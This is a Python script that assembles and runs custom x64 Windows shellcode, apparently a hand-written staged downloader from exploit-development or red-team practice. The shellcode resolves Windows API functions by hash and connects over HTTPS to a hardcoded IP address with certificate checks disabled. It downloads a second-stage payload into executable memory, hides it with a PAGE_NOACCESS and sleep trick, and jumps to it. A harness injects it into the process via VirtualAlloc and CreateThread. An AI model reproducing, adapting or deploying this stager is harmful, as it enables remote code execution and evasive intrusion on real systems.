"""
IP address at line: 226
Port at line: 231
"""

import ctypes, struct
import binascii
import os
import subprocess
from keystone import *

def main():
    SHELLCODE = (
        " start:                            "
        "   int3                            ;"
        "   mov rbp, rsp                    ;"
        "   add rsp, 0xffffffffffffffe0     ;"  # Allocate stack
        
        " find_kernel32:                    "   # start to find kernel32 library
        "   xor rcx, rcx                    ;"  # Zero RCX contents
        "   xor rax, rax                    ;"
        "   mov al, 0x24                    ;"
        "   add al, 0x3c                    ;"  # AL = 0x60
        "   mov rsi, gs:[rcx+al]            ;"  # 0x060 load PEB to RSI
        "   mov al, 0x8                     ;"
        "   add al, 0x10                    ;"  # AL = 0x18
        "   mov rsi, [rsi+al]               ;"  # 0x18 load PEB.Ldr Offset
        "   add al, 0x8                     ;"  # AL = 0x20
        "   mov rsi, [rsi+al]               ;"  # 0x20 Offset = PEB.Ldr.InMemoryOrderModuleList
        "   xor r12, r12                    ;"
        "   add r12, 0x20                   ;"  # R12 = 0x20
        "   add al, 0x30                    ;"  # AL = 0x50
        
        " next_module:                      "
        "   xor cl, cl                      ;"  # Clear CL
        "   mov rbx, [rsi+r12]              ;"  # DllBase, InMem + 0x30 - 0x10
        "   mov rdi, [rsi+al]               ;"  # ModName, InMem + 0x58 - 0x10 + 0x8 (Buffer)
        "   mov rsi, [rsi]                  ;"  # RSI = InMem.Flink (next module)
        "   cmp [rdi+0xc*2], cx             ;"  # KERNEL32.DLL is 12 bytes long, if 25th position of UNICODE is NULL, bingo
        "   jne next_module                 ;"  # If not, keep looking
        
        " confirm_kernel32:                 "
        "   mov cl, 0x6c                    ;"  # Lowercase 'l'
        "   mov dl, [rdi+0xb*2]             ;"  # Move second last char to DL
        "   cmp dl, 0x61                    ;"  # Check if current char is lowercase
        "   jl to_lower                     ;"  # If uppercase, convert to lower
        "   jmp compare_char                ;"  # If lowercase, jump to compare the char
        
        " to_lower:                         "   # Convert current char to lowercase
        "   sub dl, 0x41                    ;"  # current char - hex(ord('A'))
        "   add dl, 0x61                    ;"  # above result + hex(ord('a')) = lowercase char
        
        " compare_char:                     "   # Compare second last char to 'l'
        "   cmp dl, cl                      ;"  # Check if current char is 'l' (0x6c), address the problem when the 'exe' name is 12 characters long
        "   jne next_module                 ;"  # If the character before NULL is not 'l', then we found a module which has a name of 12 chars but not a dll, keep looking
        
        " get_find_function_ret:            "
        "   jmp find_function_short         ;"  # A short jump to call function backwards
        
        " find_function_ret:                "
        "   pop rsi                         ;"  # Pop ret addr of find_function to RSI
        "   mov [rbp+0x8], rsi              ;"  # Save ret addr of find_function to [rbp+0x8] for later use
        "   jmp resolve_functions_knl32     ;"  # Resolve functions
        
        " find_function_short:              "
        "   call find_function_ret          ;"  # This will push the ret addr of find_function on stack, we will save that for later use
               
        # Resolving VA for Export Address Table
        " find_function:                    "
        "   mov r14, 0x20                   ;"
        "   add r14, 0x30                   ;"
        "   sub r14, 0x14                   ;"  # CL = 0x3C
        "   mov eax, dword ptr [rbx+r14]    ;"  # dll->e_lfane
        "   mov edi, dword ptr [rbx+rax+0x88];"  # RDI = Export Directory RVA (0x78 + 0x10) NULL Byte
        "   add rdi, rbx                    ;"  # RDI = Export Directory VA
        "   xor rcx, rcx                    ;"  # Clear RCX TODO: no need?
        "   sub r14, 0x24                   ;"  # R14 = 0x18
        "   mov ecx, dword ptr [rdi+r14]    ;"  # RCX = NumberOfNames
        "   xor rax, rax                    ;"  # Clear RAX TODO: no need?
        "   add r14, 0x8                    ;"  # R14 = 0x20
        "   mov eax, dword ptr [rdi+r14]    ;"  # RAX = AddressOfNames RVA
        "   add rax, rbx                    ;"  # RAX = AddressOfNames VA
        "   sub r14, 0x10                   ;"  # R14 = 0x10
        "   mov [rbp+r14], rax              ;"  # Save AddressOfNames VA to [rbp+0x10]
        
        # Resolve specific function from Kerner32.dll
        " find_function_loop:               "
        "   jecxz function_found            ;"  # RCX = 0, loop over
        "   dec rcx                         ;"  # Decrese RCX counter
        "   mov rax, [rbp+0x10]             ;"  # Restore AddressOfNames VA
        "   mov esi, dword ptr [rax+rcx*4]  ;"  # ESI = RVA of function name
        "   add rsi, rbx                    ;"  # RSI = VA of function name
        
        " compute_hash:                     "
        "   xor rax, rax                    ;"  # Clear RAX
        "   cqo                             ;"  # Clear RDX
        "   cld                             ;"  # Clear direction
        
        " compute_hash_again:               "
        "   lodsb                           ;"  # Load byte at RSI into AL
        "   test al, al                     ;"  # Check for NULL terminator
        "   jz compute_hash_done            ;"  # Finish hashing when ZF is set
        "   ror edx, 0x0d                   ;"  # Rotate RDX 13 bits to the right
        "   add edx, eax                    ;"  # Add new bytes to RDX
        "   jmp compute_hash_again          ;"  # Compute hash for next byte
        
        " compute_hash_done:                "
        
        " find_function_compare:            "
        "   cmp edx, r15d                   ;"  # Compare computed hash with target hash
        "   jnz find_function_loop          ;"  # If not match, loop to next
        "   add r14, 0x14                   ;"  # R14 = 0x24
        "   mov edx, dword ptr [rdi+r14]    ;"  # EDX = AddressOfNameOrdinals RVA
        "   add rdx, rbx                    ;"  # RDX = AddressOfNameOrdinals VA
        "   mov cx, word ptr [rdx+rcx*2]    ;"  # ECX = Function's Ordinal
        "   mov edx, dword ptr [rdi+0x1c]   ;"  # EDX = AddressOfFunctions RVA
        "   add rdx, rbx                    ;"  # RDX = AddressOfFunctions VA
        "   mov eax, dword ptr [rdx+rcx*4]  ;"  # EAX = Function RVA
        "   add rax, rbx                    ;"  # RAX = Function VA; Save Function VA to RAX

        " function_found:                   "
        "   ret                             ;"
        
        " resolve_functions_knl32:          "
        "   mov r15, 0x78b5b983             ;"  # TerminateProcess hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x18], rax             ;"  # Save TerminateProcess to [rbp+0x18]
        "   mov r15, 0xec0e4e8e             ;"  # LoadLibraryA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x20], rax             ;"  # Save LoadLibraryA to [rbp+0x20]
        "   mov r15, 0x4c0297fa             ;"  # LocalAlloc hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x28], rax             ;"  # Save LocalAlloc to [rbp+0x28]
        "   mov r15, 0x7946c61b             ;"  # VirtualProtect hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x30], rax             ;"  # Save VirtualProtect to [rbp+0x30]
        "   mov r15, 0xdb2d49b0             ;"  # Sleep hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x70], rax             ;"  # Save Sleep to [rbp+0x70]
           
        " dummy_1:                          "  # stage 1 and 2 separator 0x90 * 10
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        
        " load_wininet:                     "
        "   xor rax, rax                    ;"  # Clear RAX for ws2_32.dll\0 string
        "   mov eax, 0x86733920             ;"
        "   sub eax, 0x8606ccbc             ;"  # Result: EAX = \0lld, 0x6c6c64
        "   push rax                        ;"  # Stack = \0lld
        "   mov rax, 0xd18b9a91a9bdedab     ;"
        "   sub rax, 0x132c5722             ;"
        "   neg rax                         ;"  # Result: RAX = .teniniw 0x2e74656e696e6977
        "   push rax                        ;"  # Stack = \0lld.teniniw
        "   mov rcx, rsp                    ;"  # Argument pointer to LoadLibraryA
        "   add rsp, 0xffffffffffffff98     ;"  # Stack space & home space
        "   call qword ptr [rbp+0x20]       ;"  # Call LoadLibraryA
        "   mov rbx, rax                    ;"  # Save base address of wininet.dll to RBX
        "   add rsp, 0x78                   ;"  # Cleanup
        
        " resolve_functions_wininet:        "
        "   mov r15, 0x57e84429             ;"  # InternetOpenA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x38], rax             ;"  # Save InternetOpenA to [rbp+0x38]
        "   mov r15, 0x1e4be80e             ;"  # InternetConnectA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x40], rax             ;"  # Save InternetConnectA to [rbp+0x40]
        "   mov r15, 0xf7de769f             ;"  # HttpOpenRequestA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x48], rax             ;"  # Save HttpOpenRequestA to [rbp+0x48]
        "   mov r15, 0xf5efa00d             ;"  # InternetSetOptionA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x50], rax             ;"  # Save InternetSetOptionA to [rbp+0x50]
        "   mov r15, 0x2de6be9d             ;"  # HttpSendRequestA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x58], rax             ;"  # Save HttpSendRequestA to [rbp+0x58]
        "   mov r15, 0x5fe34b8b             ;"  # InternetReadFile hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x60], rax             ;"  # Save InternetReadFile to [rbp+0x60]
        
        " dummy_2:                          "   # stage 2 and 3 separator 0x90 * 10
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        
        " call_internetopena:               " 
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   inc rcx                         ;"  # Useless
        "   xor rcx, rcx                    ;"  # Clear RCX
        "   push rcx                        ;"  # Don't forget to check alignment
        "   mov rcx, rsp                    ;"  # First arg, lpszAgent (NULL byte)
        "   xor rax, rax                    ;"  # Clear RAX
        "   mov rdx, rax                    ;"  # Second arg, dwAccessType, NULL
        "   mov r8, rax                     ;"  # Third arg, lpszProxy, NULL
        "   mov r9, rax                     ;"  # Fourth arg, lpszProxyBypass, NULL
        "   push rax                        ;"  # Fifth arg, dwFlags, NULL
        "   push rax                        ;"  # Alignment
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x38]       ;"  # Call InternetOpenA
        "   test al, al                     ;"  # Check return
        "   jz call_terminate_process       ;"  # If NULL, terminate process
        "   add rsp, 0xb8                   ;"  # Cleanup
        
        # modify server name on the stack accordingly
        " call_internetconnecta:            "
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   xor rcx, rcx                    ;"  # Useless
        "   inc rcx                         ;"  # Useless
        "   mov rcx, rax                    ;"  # First arg, hInternet, handle obtained above
        "   xor rax, rax                    ;"  # Clear RAX
        "   push rax                        ;"  # NULL byte
        "   mov eax, 0x30322e33             ;"  # EAX = 02.3
        "   push rax                        ;"  # Stack = \002.3
        "   mov rax, 0x2e3836312e323931     ;"  # RAX = .861.291
        "   push rax                        ;"  # Stack = \002.3.861.291
        "   mov rdx, rsp                    ;"  # Second arg, lpszServerName
        "   mov r8, 0x1bb                   ;"  # Third arg, nServerPort, 443 in decimal
        "   xor r9, r9                      ;"  # Fourth arg, lpszUsername, NULL
        "   push r9                         ;"  # Eighth arg, dwContext, NULL
        "   push r9                         ;"  # Seventh arg, dwFlags, NULL
        "   push 0x3                        ;"  # Sixth arg, dwService, INTERNET_SERVICE_HTTP
        "   push r9                         ;"  # Fifth arg, lpszPassword, NULL                   
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x40]       ;"  # Call InternetConnectA
        "   test al, al                     ;"  # Check return
        "   jz call_terminate_process       ;"  # If NULL, terminate process
        "   add rsp, 0xd8                   ;"  # Cleanup
        
        " call_httpopenrequsta:             "
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   xor rcx, rcx                    ;"  # Useless
        "   inc rcx                         ;"  # Useless
        "   mov rcx, rax                    ;"  # First arg, hConnect
        "   xor rdx, rdx                    ;"  # Second arg, lpszVerb, NULL
        "   push rdx                        ;"  # Alignment
        "   push rdx                        ;"  # NULL byte
        "   mov rax, 0x524d4b4c52767547     ;"
        "   push rax                        ;"
        "   mov rax, 0x7956636139374958     ;"
        "   push rax                        ;"
        "   mov rax, 0x4c694b7339475f75     ;"
        "   push rax                        ;"
        "   mov rax, 0x3757336f5f77524c     ;"
        "   push rax                        ;"
        "   mov rax, 0x31782d7257624746     ;"
        "   push rax                        ;"
        "   mov rax, 0x66557a334c4c426e     ;"
        "   push rax                        ;"
        "   mov rax, 0x6c37506553426154     ;"
        "   push rax                        ;"
        "   mov rax, 0x742d77412d327937     ;"
        "   push rax                        ;"
        "   mov rax, 0x35347547664a6568     ;"
        "   push rax                        ;"
        "   mov rax, 0x48757450305a7532     ;"
        "   push rax                        ;"
        "   mov rax, 0x5068543048456376     ;"
        "   push rax                        ;"
        "   mov rax, 0x5a6956436f584f41     ;"
        "   push rax                        ;"
        "   mov rax, 0x33414c334869656e     ;"
        "   push rax                        ;"
        "   mov rax, 0x68476855336a796b     ;"
        "   push rax                        ;"
        "   mov rax, 0x5877327037724348     ;"
        "   push rax                        ;"
        "   mov rax, 0x456a385752304b36     ;"
        "   push rax                        ;"
        "   mov rax, 0x6a6c4d6149537a4e     ;"
        "   push rax                        ;"
        "   mov rax, 0x527743594338574a     ;"
        "   push rax                        ;"
        "   mov rax, 0x6767336d6a553058     ;"
        "   push rax                        ;"
        "   mov rax, 0x444b576c75665a65     ;"
        "   push rax                        ;"
        "   mov rax, 0x44744549724a7246     ;"
        "   push rax                        ;"
        "   mov rax, 0x5f65524878746133     ;"
        "   push rax                        ;"
        "   mov rax, 0x46737437614c735f     ;"
        "   push rax                        ;"
        "   mov rax, 0x6b76545f6d4b2d6a     ;"
        "   push rax                        ;"
        "   mov rax, 0x4e31676c53723549     ;"
        "   push rax                        ;"
        "   mov rax, 0x635a6b584839716f     ;"
        "   push rax                        ;"
        "   mov rax, 0x5672624c36354d4c     ;"
        "   push rax                        ;"
        "   mov r8, rsp                     ;"  # Third arg, lpszObjectName
        "   xor r9, r9                      ;"  # Fourth arg, lpszVersion
        "   push rdx                        ;"  # Eighth arg, dwContext, NULL
        "   add rax, 0x60010000             ;"
        "   add rax, 0x33206963             ;"
        "   add rax, 0xfffffffff17ec89d     ;"  # Result: RAX = 0x84a03200, dwFlags
        "   push rax                        ;"  # Seventh arg, dwFlags, as follows
                                                # INTERNET_FLAG_RELOAD | 0x80000000
                                                # INTERNET_FLAG_SECURE | 0x00800000
                                                # INTERNET_FLAG_NO_CACHE_WRITE | 0x04000000
                                                # INTERNET_FLAG_NO_AUTO_REDIRECT | 0x00200000
                                                # INTERNET_FLAG_IGNORE_CERT_CN_INVALID | 0x00001000
                                                # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | 0x00002000
                                                # INTERNET_FLAG_NO_UI 0x00000200                           
        "   push rdx                        ;"  # Sixth arg, lpszpszAcceptTypes, NULL, push rdx is only one byte, use that instead of push r9 (two bytes)
        "   push rdx                        ;"  # Fifth arg, lpszReferrer, NULL
        "   pop rdx                         ;"  # Useless
        "   push rdx                        ;"
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x48]       ;"  # Call HttpOpenRequestA
        "   test al, al                     ;"  # Check return
        "   jz call_terminate_process       ;"  # If NULL, terminate process
        "   mov [rbp+0x68], rax             ;"  # Save handle of request at [rbp+0x68]
        "   add rsp, 0x1a8                   ;"  # Cleanup

        " retry_counter:                    ;"  # Retry on send request fail
        "   push byte 0xa                   ;"  # Retry 10 times
        "   pop rdi                         ;"  # Save counter to RDI
        
        " call_internetsetoptiona:          "
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   mov rcx, rax                    ;"  # First arg, hInternet
        "   mov rdx, 0x1f                   ;"  # Second arg, dwOption, INTERNET_OPTION_SECURITY_FLAGS
        "   push qword 0x00003380           ;"
                                                # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 0x00002000
                                                # SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 0x00001000
                                                # SECURITY_FLAG_IGNORE_WRONG_USAGE | 0x00000200
                                                # SECURITY_FLAG_IGNORE_UNKNOWN_CA | 0x00000100
                                                # SECURITY_FLAG_IGNORE_REVOCATION | 0x00000080
        "   mov r8, rsp                     ;"  # Third arg, lpBuffer
        "   mov r9, 0x4                     ;"  # Fourth arg, dwBufferLength, 0x4
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x50]       ;"  # Call InternetSetOptionA
        "   test al, al                     ;"  # Check return
        "   jz call_terminate_process       ;"  # If NULL, terminate process
        "   add rsp, 0xa8                   ;"  # Cleanup
        
        " call_httpsendrequesta:            "
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   mov rcx, [rbp+0x68]             ;"  # First arg, hRequest
        "   xor rdx, rdx                    ;"  # Second arg, lpszHeaders, NULL
        "   xor r8, r8                      ;"  # Third arg, dwHeadersLength, NULL
        "   xor r9, r9                      ;"  # Fourth arg, lpOptional, NULL
        "   push rdx                        ;"  # Fifth arg, dwOptionalLength, NULL
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x58]       ;"  # Call HttpSendRequestA
        "   add rsp, 0xa8                   ;"  # Cleanup
        "   test al, al                     ;"  # Check return
        "   jnz call_localalloc             ;"  # If success, proceed

        " retry:                            "   # If failed, retry 10 times
        "   dec rdi                         ;"  # Decrease counter
        "   jz call_terminate_process       ;"  # If failed 10 times, terminate process
        "   jmp call_internetsetoptiona     ;"  # Retry
        
        " call_localalloc:                  "   # Call LocalAlloc to allocate buffer for stage 2
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   mov rcx, 0x40                   ;"  # First arg, uFlags, 0x40, LPTR
        "   mov rdx, 0x40000                ;"  # Second arg, uBytes
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x28]       ;"  # Call LocalAlloc
        "   test eax, eax                   ;"  # Check return
        "   jz call_terminate_process       ;"  # If NULL, terminate process
        "   add rsp, 0xa0                   ;"  # Cleanup
        
        " prep_read_file:                   "
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   xor r15, r15                    ;"  # Count total size of stage 2
        "   mov r14, rax                    ;"  # Save stage 2 buffer address to R14
        "   mov r13, rax                    ;"  # R13 serves as offset into the buffer
        "   add r13, 0x1000                 ;"  # Offset one page
        "   push r15                        ;"  # Alignment
        "   mov rsi, rsp                    ;"  # RSI serves as lpdwNumberOfBytesRead
      
        " call_internetreadfile:            "
        "   mov rcx, [rbp+0x68]             ;"  # First arg, hFile
        "   mov rdx, r13                    ;"  # Second arg, lpBuffer
        "   mov r8, 0x1000                  ;"  # Third arg, dwNumberOfBytesToRead, 4096 bytes
        "   mov r9, rsi                     ;"  # Fourth arg, lpdwNumberOfBytesRead, on stack
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x60]       ;"  # Call InternetReadFile
        "   add rsp, 0x20                   ;"  # Clear home space
        
        " process_bytes_read:               ;"
        "   xor rax, rax                    ;"
        "   mov ax, word ptr [rsi]          ;"
        "   add r13, rax                    ;"  # Add bytes read to R13, buffer shitfs to position for next read
        "   add r15, rax                    ;"  # This is total bytes received so far

        " check_bytes_read:                 "
        "   cmp eax, 0x0                    ;"  # Check if there's any bytes read
        "   jnz call_internetreadfile       ;"  # Keep reading
        "   add rsp, 0x88                   ;"  # Cleanup, 8 for the push
        "   mov al, 0x40                    ;"  # PAGE_EXECUTE_READWRITE
        
        " call_virtual_protect:             "   # Change mem protection to RX
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   mov rcx, r14                    ;"  # First arg, lpAddress
        "   add r15, 0x2000                 ;"  # Include the evasion code
        "   mov rdx, r15                    ;"  # Second arg, dwSize, 0x40000?
        "   mov r8, rax                     ;"  # Third arg, flNewProtect, PAGE_EXECUTE_READWRITE, RX will fail because the stager will write to mem space, so, RWX is a must
        "   mov r9, rsp                     ;"
        "   sub r9, 0x10                    ;"  # Fourth arg, lpflOldProtect
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x30]       ;"  # Call VirtualProtect
        "   test al, al                     ;"  # Check return
        "   jz call_terminate_process       ;"  # If zero, terminate process
        "   add rsp, 0xa0                   ;"  # Cleanup
        
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        
        " prep_stage_2:                     "

        # ====== VirtualProtect PAGE_NOACCESS =======
        "   mov rsi, 0x4cf1894c80c48348     ;"
        "   mov [r14], rsi                  ;"
        "   mov rsi, 0xe18949c08949fa89     ;"
        "   mov [r14+0x8], rsi              ;"
        "   mov rsi, 0xe0c4834810e98349     ;"
        "   mov [r14+0x10], rsi             ;"
        "   mov rsi, 0xa0c481483055ff       ;"
        "   mov [r14+0x18], rsi             ;"
        
        # ================= Sleep 10 =================
        "   mov rsi, 0x66c9314880c48348     ;"
        "   mov [r14+0x22], rsi             ;"
        "   mov rsi, 0xffe0c483482710b9     ;"
        "   mov [r14+0x2a], rsi             ;"
        "   mov rsi, 0xa0c481487055         ;"
        "   mov [r14+0x32], rsi             ;"
        
        # == VirtualProtect PAGE_EXECUTE_READWRITE ===
        "   mov rsi, 0x894c80c483484004     ;"
        "   mov [r14+0x3b], rsi             ;"
        "   mov rsi, 0x49c08949fa894cf1     ;"
        "   mov [r14+0x43], rsi             ;"
        "   mov rsi, 0x834810e98349e189     ;"
        "   mov [r14+0x4b], rsi             ;"
        "   mov rsi, 0xc481483055ffe0c4     ;"
        "   mov [r14+0x53], rsi             ;"
        "   mov rsi, 0xa0                   ;"
        "   mov [r14+0x5b], rsi             ;"
        
        # ================== Jmp R14 ==================
        "   mov rsi, 0xe6ff41               ;"
        "   mov [r14+0x5f], rsi             ;"
        
        # =================== Set up ===================
        "   mov r13, r14                    ;"  # R13 points to buffer now
        "   mov al, 0x1                     ;"  # PAGE_NOACCESS
        "   add r14, 0x1000                 ;"  # Start of stage 2 where to mark as PAGE_NOACCESS
         
        " execute:                          "
        "   jmp r13                         ;"  # Execute
        
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        "nop                                ;"
        
        " call_terminate_process:           "
        "   mov rcx, 0xffffffffffffffff     ;"  # -1, Current process
        "   xor rdx, rdx                    ;"  # NULL
        "   call qword ptr [rbp+0x18]       ;"  # Call TerminateProcess
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
    shellcode = bytearray(sh)
    print("Shellcode: "  + output )
    print("Bytes: " + str(len(sh)))
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()

